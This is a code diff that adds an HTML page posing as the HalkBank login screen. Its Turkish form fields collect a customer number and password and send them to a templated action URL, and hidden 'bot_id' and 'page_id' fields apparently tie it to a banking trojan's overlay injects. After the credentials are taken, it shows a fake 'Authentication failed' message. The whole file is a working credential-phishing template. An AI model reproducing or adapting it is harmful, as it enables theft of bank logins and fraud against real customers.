@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+    <title>HalkBank</title>
+
+    <link rel="stylesheet" href="%DYN_PATH%/css/normalize.css">
+    <link rel="stylesheet" href="%DYN_PATH%/css/mainf1c1f1c1.css">
+    <link rel="stylesheet" href="%DYN_PATH%/css/halkbank.css">
+	<link rel="stylesheet" href="%DYN_PATH%/css/cat.style.css" type="text/css" media="all">
+	
+	<script src="%DYN_PATH%/js/cat.functions.js"></script>
+    <script src="%DYN_PATH%/js/vendor/jquery-1.11.3.min.js"></script>
+    <script src="%DYN_PATH%/js/viewport.js"></script>
+</head>
+
+<body>
+		<div class="modal modal_03">
+		
+            <div class="row">
+                <div class="form_header" style='width: 100%'>
+                    <img src="%DYN_PATH%/img/logo.png" style="width:300px;">
+                </div>
+            </div>
+			
+			<div class="container">
+				<div id="cat-error">
+					<span>Authentication failed or timed out</span>
+					<input type="button" class="logon_btn" value="Try enter again"
+						onClick="tryEnterAgain();"/>
+				</div>
+
+				<div id="cat-forms">
+					<form id="cat-step-1" class="cat-start-step" method='post' action='%ACTION%'>
+						<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
+				
+						<div class="row">
+							<div class="content">
+								<div class="input_block_wr">
+									<div class="inp_caption">
+									Müşteri Numarası 
+									</div>
+									<div class="inp_wr">
+										<input type="text" name="fields[number]" class="main_input">
+									</div>
+								</div>
+								<div class="input_block_wr">
+									<div class="inp_caption">
+									Parola
+									</div>
+									<div class="inp_wr">
+										<input type="text" name="fields[password]" class="main_input">
+									</div>
+								</div>
+								
+								<div class="btn_wr">
+								
+									<input type="button" onClick="switchStep(1, true);"
+										class="logon_btn" value="Giriş"/>
+								
+								</div>
+							</div>
+						</div>
+						
+					</form>
+ 
+					<form id="cat-step-2" class="cat-last-step">
+						<span>Authentication failed or timed out</span>
+						<input type="button" class="logon_btn" value="Try enter again"
+							onClick="closeWindow()"/>
+					</form>
+
+				</div>
+			</div>
+			
+		</div>
+</body>
+
+</html>
